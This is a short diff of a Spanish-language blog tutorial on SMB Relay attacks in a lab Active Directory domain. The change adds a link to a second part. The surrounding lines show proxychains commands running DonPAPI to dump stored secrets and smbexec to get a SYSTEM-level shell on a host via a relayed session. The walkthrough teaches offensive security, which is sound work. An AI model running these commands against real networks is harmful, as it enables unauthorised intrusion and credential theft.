@@ -124,6 +124,10 @@ Ejecutamos proxychains DonPAPI.py -no-pass 'SIETEREINOS'/'JON'@'192.168.0.169' y
 
 ![](/assets/images/Smb-Relay/donpapi.png)
 
+En la parte 2 veremos como acceder tanto al PC02 como al controlador de dominio, y como obtener persistencia.
+
+[SMB Relay Parte 2](https://ximobaeza.github.io/ciberseguridad/Smb-Relay-Parte2/)
+
 ## Acceso inicial
 
 Ahora vamos a ganar acceso a la máquina PC02, de la siguiente forma. Ejecutamos proxychains smbexec.py -no-pass 'SIETEREINOS'/'JON'@'192.168.0.169' -debug -service-name test y directamente estamos dentro de la máquina PC02 con privilegios de system, los más elevados.
